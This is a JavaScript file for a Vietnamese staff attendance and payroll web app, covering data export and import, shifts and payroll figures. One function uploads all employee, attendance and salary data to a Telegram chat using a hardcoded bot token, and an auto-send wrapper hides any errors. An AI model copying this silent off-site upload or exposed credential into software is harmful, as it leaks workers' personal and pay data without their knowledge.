// Hàm lấy dữ liệu xuất chuẩn (đồng bộ với menu.js)
function getExportData() {
    const employees = JSON.parse(localStorage.getItem('employees') || '[]');
    const validEmpIds = new Set(employees.map(e => e.id));
    const allShiftsByEmp = JSON.parse(localStorage.getItem('shiftsByEmp') || '{}');
    let shiftsByEmp = {};
    Object.keys(allShiftsByEmp).forEach(empId => {
        if (validEmpIds.has(empId)) shiftsByEmp[empId] = allShiftsByEmp[empId];
    });
    if (employees.length === 0) {
        shiftsByEmp = {};
    }
    // shiftsByEmpByMonth: luôn có ít nhất 1 ca mặc định nếu chưa có ca nào
    const allShiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let shiftsByEmpByMonth = {};
    Object.keys(allShiftsByEmpByMonth).forEach(month => {
        let monthObj = {};
        Object.keys(allShiftsByEmpByMonth[month]).forEach(empId => {
            if (validEmpIds.has(empId)) {
                let arr = allShiftsByEmpByMonth[month][empId];
                if (!Array.isArray(arr)) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                if (Array.isArray(arr) && arr.length === 0) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                monthObj[empId] = arr;
            }
        });
        if (Object.keys(monthObj).length > 0) {
            shiftsByEmpByMonth[month] = monthObj;
        }
    });
    // Thu thập workDaysStd_* và salaryPerDay_* cho từng nhân viên
    let workDaysStdByEmp = {};
    let salaryPerDayByEmp = {};
    Object.keys(localStorage).forEach(k => {
        if (k.startsWith('workDaysStd_')) {
            workDaysStdByEmp[k.replace('workDaysStd_', '')] = localStorage.getItem(k);
        }
        if (k.startsWith('salaryPerDay_')) {
            salaryPerDayByEmp[k.replace('salaryPerDay_', '')] = localStorage.getItem(k);
        }
    });

    return {
        employees,
        attendanceByMonth: JSON.parse(localStorage.getItem('attendanceByMonth') || '{}'),
        workDaysStd: String(Number(localStorage.getItem('workDaysStd')) || 26),
        salaryPerDay: String(Number(localStorage.getItem('salaryPerDay')) || 0),
        shiftsByEmp,
        shiftsByEmpByMonth,
        payrollInputs: JSON.parse(localStorage.getItem('payrollInputs') || '{}'), // advance (tiền ứng) nằm trong đây
        notes: (() => {
            let notes = {};
            Object.keys(localStorage).forEach(k => {
                if (k.startsWith('note_')) notes[k] = localStorage.getItem(k);
            });
            return notes;
        })(),
        workDaysStdByEmp,
        salaryPerDayByEmp,
        // Thêm các dòng sau để xuất lịch làm việc và ca mẫu lịch làm việc
        workSchedules: JSON.parse(localStorage.getItem('workSchedules') || '{}'),
        scheduleShiftsByMonth: JSON.parse(localStorage.getItem('scheduleShiftsByMonth') || '{}'),
        workScheduleWeekTemplate: JSON.parse(localStorage.getItem('workScheduleWeekTemplate') || '{}'),
        workScheduleWeekNames: JSON.parse(localStorage.getItem('workScheduleWeekNames') || '{}')
    };
}

// Xuất file JSON
function exportAllData() {
    const data = getExportData();
    const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'qlnv_data.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// Gửi dữ liệu lên Telegram Bot
function sendDataToTelegramBot(jsonData) {
    // Thay YOUR_BOT_TOKEN và YOUR_CHAT_ID bằng thông tin thật của bạn
    const BOT_TOKEN = '7699835490:AAHXNqBbklJBgBxKBhRm2vBi2Ssjls4YVuw';
    const CHAT_ID = '7991407654';
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

    // Đặt tên file theo Lepshop + ngày tháng năm, giờ phút giây
    const now = new Date();
    const pad = n => String(n).padStart(2, '0');
    const fileName = `Lepshop-${pad(now.getDate())}-${pad(now.getMonth()+1)}-${now.getFullYear()}_${pad(now.getHours())}-${pad(now.getMinutes())}-${pad(now.getSeconds())}.json`;

    // Thêm chú thích văn bản gửi kèm file
    const caption = `Dữ liệu TimePro HRM (Lepshop) gửi lúc ${pad(now.getDate())}/${pad(now.getMonth()+1)}/${pad(now.getFullYear())} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;

    const blob = new Blob([jsonData], {type: 'application/json'});
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', blob, fileName);
    formData.append('caption', caption);

    fetch(url, {
        method: 'POST',
        body: formData
    });
}

// Gửi tự động lên bot
function autoSendDataToTelegramBot() {
    try {
        const data = getExportData();
        sendDataToTelegramBot(JSON.stringify(data));
    } catch (e) {}
}

// Hàm nhập lại toàn bộ dữ liệu từ file JSON (áp dụng lại dữ liệu)
function importAllData(jsonData) {
    try {
        const data = typeof jsonData === 'string' ? JSON.parse(jsonData) : jsonData;
        // Xóa sạch các key liên quan trước khi nhập lại
        Object.keys(localStorage).forEach(k => {
            if (
                k === 'employees' ||
                k === 'attendanceByMonth' ||
                k === 'workDaysStd' ||
                k === 'salaryPerDay' ||
                k === 'shiftsByEmp' ||
                k === 'shiftsByEmpByMonth' ||
                k === 'payrollInputs' ||
                k.startsWith('note_') ||
                k.startsWith('workDaysStd_') ||
                k.startsWith('salaryPerDay_')
            ) {
                localStorage.removeItem(k);
            }
        });

        // --- Merge employees: nếu trùng ID thì thêm mới với ID khác và tên khác ---
        let oldEmployees = JSON.parse(localStorage.getItem('employees') || '[]');
        let newEmployees = data.employees || [];
        let existingIds = new Set(oldEmployees.map(e => e.id));
        let existingNames = new Set(oldEmployees.map(e => e.name));
        let mergedEmployees = [...oldEmployees];

        newEmployees.forEach(emp => {
            if (existingIds.has(emp.id)) {
                // Tìm tên mới không trùng
                let baseName = emp.name || 'Nhân viên';
                let suffix = 2;
                let newName = baseName;
                while (existingNames.has(newName)) {
                    newName = `${baseName} (${suffix++})`;
                }
                // Tạo ID mới duy nhất
                let newId = emp.id;
                while (existingIds.has(newId)) {
                    newId = emp.id + '_' + Math.floor(Math.random() * 1000000);
                }
                let newEmp = { ...emp, id: newId, name: newName };
                mergedEmployees.push(newEmp);
                existingIds.add(newEmp.id);
                existingNames.add(newName);
            } else {
                mergedEmployees.push(emp);
                existingIds.add(emp.id);
                existingNames.add(emp.name);
            }
        });

        localStorage.setItem('employees', JSON.stringify(mergedEmployees));

        // Ghi lại dữ liệu
        if (data.employees) localStorage.setItem('employees', JSON.stringify(data.employees));
        if (data.attendanceByMonth) localStorage.setItem('attendanceByMonth', JSON.stringify(data.attendanceByMonth));
        if (data.workDaysStd) localStorage.setItem('workDaysStd', data.workDaysStd);
        if (data.salaryPerDay) localStorage.setItem('salaryPerDay', data.salaryPerDay);
        if (data.shiftsByEmp) localStorage.setItem('shiftsByEmp', JSON.stringify(data.shiftsByEmp));
        if (data.shiftsByEmpByMonth) {
            localStorage.setItem('shiftsByEmpByMonth', JSON.stringify(data.shiftsByEmpByMonth));
        }
        // Ghi lại payrollInputs (bao gồm TC/LT, Phụ cấp, Thưởng lễ, Phạt)
        if (data.payrollInputs) {
            localStorage.setItem('payrollInputs', JSON.stringify(data.payrollInputs));
        }
        if (data.notes) {
            Object.keys(data.notes).forEach(k => {
                localStorage.setItem(k, data.notes[k]);
            });
        }
        if (data.workDaysStdByEmp) {
            Object.keys(data.workDaysStdByEmp).forEach(empId => {
                localStorage.setItem('workDaysStd_' + empId, data.workDaysStdByEmp[empId]);
            });
        }
        if (data.salaryPerDayByEmp) {
            Object.keys(data.salaryPerDayByEmp).forEach(empId => {
                localStorage.setItem('salaryPerDay_' + empId, data.salaryPerDayByEmp[empId]);
            });
        }
        if (data.workSchedules) localStorage.setItem('workSchedules', JSON.stringify(data.workSchedules));
        if (data.scheduleShiftsByMonth) localStorage.setItem('scheduleShiftsByMonth', JSON.stringify(data.scheduleShiftsByMonth));
        if (data.workScheduleWeekTemplate) localStorage.setItem('workScheduleWeekTemplate', JSON.stringify(data.workScheduleWeekTemplate));
        if (data.workScheduleWeekNames) localStorage.setItem('workScheduleWeekNames', JSON.stringify(data.workScheduleWeekNames));
        // Sau khi nhập xong có thể reload lại trang hoặc cập nhật giao diện nếu cần

        // Phát tín hiệu đồng bộ cho các tab khác
        if (window.localStorage) {
            localStorage.setItem('sync_data_trigger', Date.now().toString());
        }

        // Reload lại trang hiện tại để cập nhật giao diện (nếu muốn)
        if (typeof location !== 'undefined' && location.reload) {
            location.reload();
        }
    } catch (e) {
        alert('Lỗi khi nhập dữ liệu: ' + e.message);
    }
}

// Hàm cập nhật giờ bắt đầu/kết thúc ca cho một nhân viên/tháng/ca
function updateShiftTime(month, empId, shiftIndex, start, end) {
    // Luôn cập nhật shiftsByEmpByMonth từ localStorage trước khi sửa
    let shiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    if (
        shiftsByEmpByMonth[month] &&
        shiftsByEmpByMonth[month][empId] &&
        Array.isArray(shiftsByEmpByMonth[month][empId]) &&
        shiftsByEmpByMonth[month][empId][shiftIndex]
    ) {
        if (typeof start !== 'undefined') shiftsByEmpByMonth[month][empId][shiftIndex].start = start || '';
        if (typeof end !== 'undefined') shiftsByEmpByMonth[month][empId][shiftIndex].end = end || '';
        // Gán lại object vào shiftsByEmpByMonth để đảm bảo reference không bị mất
        if (!localStorage.getItem('shiftsByEmpByMonth')) {
            localStorage.setItem('shiftsByEmpByMonth', JSON.stringify({}));
        }
        localStorage.setItem('shiftsByEmpByMonth', JSON.stringify(shiftsByEmpByMonth));
    }
}

// Hàm xóa dữ liệu payrollInputs của tháng cũ khi chuyển tháng (dùng trong Bảng Lương)
function clearPayrollInputsForMonth(month) {
    let payrollInputs = JSON.parse(localStorage.getItem('payrollInputs') || '{}');
    let changed = false;
    Object.keys(payrollInputs).forEach(empId => {
        if (payrollInputs[empId] && payrollInputs[empId][month]) {
            delete payrollInputs[empId][month];
            changed = true;
        }
        // Nếu sau khi xóa không còn tháng nào thì xóa luôn empId đó
        if (payrollInputs[empId] && Object.keys(payrollInputs[empId]).length === 0) {
            delete payrollInputs[empId];
            changed = true;
        }
    });
    if (changed) {
        localStorage.setItem('payrollInputs', JSON.stringify(payrollInputs));
    }
}

// Hàm lấy dữ liệu payrollInputs cho từng nhân viên và từng tháng
function getPayrollInput(empId, month, key) {
    const payrollInputs = JSON.parse(localStorage.getItem('payrollInputs') || '{}');
    if (payrollInputs[empId] && payrollInputs[empId][month]) {
        return payrollInputs[empId][month][key] || '';
    }
    return '';
}

// Hàm cập nhật dữ liệu payrollInputs cho từng nhân viên và từng tháng
function setPayrollInput(empId, month, key, value) {
    let payrollInputs = JSON.parse(localStorage.getItem('payrollInputs') || '{}');
    if (!payrollInputs[empId]) payrollInputs[empId] = {};
    if (!payrollInputs[empId][month]) payrollInputs[empId][month] = {};
    payrollInputs[empId][month][key] = value;
    localStorage.setItem('payrollInputs', JSON.stringify(payrollInputs));
}

// Hàm lấy tổng số công của một nhân viên trong một tháng (giống Tổng công bên bảng chấm công)
function getTotalWorkDays(empId, month) {
    const attendanceByMonth = JSON.parse(localStorage.getItem('attendanceByMonth') || '{}');
    const shiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let total = 0;
    if (
        attendanceByMonth[month] &&
        attendanceByMonth[month][empId] &&
        shiftsByEmpByMonth[month] &&
        shiftsByEmpByMonth[month][empId]
    ) {
        const empAtt = attendanceByMonth[month][empId];
        const shifts = shiftsByEmpByMonth[month][empId];
        // Tổng công = tổng số công của tất cả các ca trong tháng (giống bảng chấm công)
        let caCong = [];
        let numShifts = shifts.length || 1;
        for (let s = 0; s < numShifts; ++s) {
            let rowWork = 0;
            Object.keys(empAtt).forEach(day => {
                let arr = empAtt[day];
                if (Array.isArray(arr) && arr.includes(s)) {
                    rowWork += shifts[s]?.half ? 0.5 : 1;
                }
            });
            caCong[s] = rowWork;
        }
        total = caCong.reduce((a, b) => a + b, 0);
    }
    return total;
}

// Hàm lấy Tổng công (tổng số công của tất cả ca làm trong tháng, không loại trùng ca/ngày)
function getTongCong(empId, month) {
    const attendanceByMonth = JSON.parse(localStorage.getItem('attendanceByMonth') || '{}');
    const shiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let total = 0;
    if (
        attendanceByMonth[month] &&
        attendanceByMonth[month][empId] &&
        shiftsByEmpByMonth[month] &&
        shiftsByEmpByMonth[month][empId]
    ) {
        const empAtt = attendanceByMonth[month][empId];
        const shifts = shiftsByEmpByMonth[month][empId];
        Object.keys(empAtt).forEach(day => {
            let arr = empAtt[day];
            if (Array.isArray(arr)) {
                arr.forEach(shiftIdx => {
                    if (typeof shifts[shiftIdx] !== 'undefined') {
                        total += shifts[shiftIdx].half ? 0.5 : 1;
                    }
                });
            }
        });
    }
    return total;
}

// Hàm xuất dữ liệu và đồng bộ dữ liệu trên tất cả các trang (gọi ở bất kỳ trang html nào cũng đồng bộ)
function exportAllDataAndSync() {
    // Lưu lại toàn bộ dữ liệu hiện tại vào localStorage (nếu có thay đổi trên giao diện)
    // (Nếu các trang đã tự lưu vào localStorage khi thao tác thì không cần bước này)
    // Sau đó xuất file như bình thường
    exportAllData();

    // Gửi tín hiệu đồng bộ cho các tab khác (nếu đang mở nhiều tab)
    if (window.localStorage) {
        // Tạo một key tạm để trigger sự kiện storage trên các tab khác
        localStorage.setItem('sync_data_trigger', Date.now().toString());
    }
}

// Lắng nghe sự kiện đồng bộ dữ liệu trên tất cả các trang (tab)
window.addEventListener('storage', function(e) {
    if (e.key === 'sync_data_trigger') {
        // Khi có tín hiệu đồng bộ, reload lại dữ liệu từ localStorage
        // (Các trang nên có hàm reload dữ liệu từ localStorage, ví dụ: renderAttendance, calcPayroll, ...)
        if (typeof renderAttendance === 'function') renderAttendance();
        if (typeof calcPayroll === 'function') calcPayroll();
        // Thêm các hàm render khác nếu có
    }
});

// Xuất lịch làm việc theo từng nhân viên (dạng JSON)
function exportWorkScheduleJsonByEmployee() {
    const workSchedules = JSON.parse(localStorage.getItem('workSchedules') || '{}');
    const employees = JSON.parse(localStorage.getItem('employees') || '[]');
    let result = {};
    for (let month in workSchedules) {
        for (let empId in workSchedules[month]) {
            let emp = employees.find(e => e.id == empId);
            let empName = emp ? emp.name : empId;
            if (!result[empName]) result[empName] = {};
            result[empName][month] = workSchedules[month][empId];
        }
    }
    const jsonStr = JSON.stringify(result, null, 2);
    const blob = new Blob([jsonStr], {type: "application/json"});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'work_schedules_by_employee.json';
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }, 100);
}
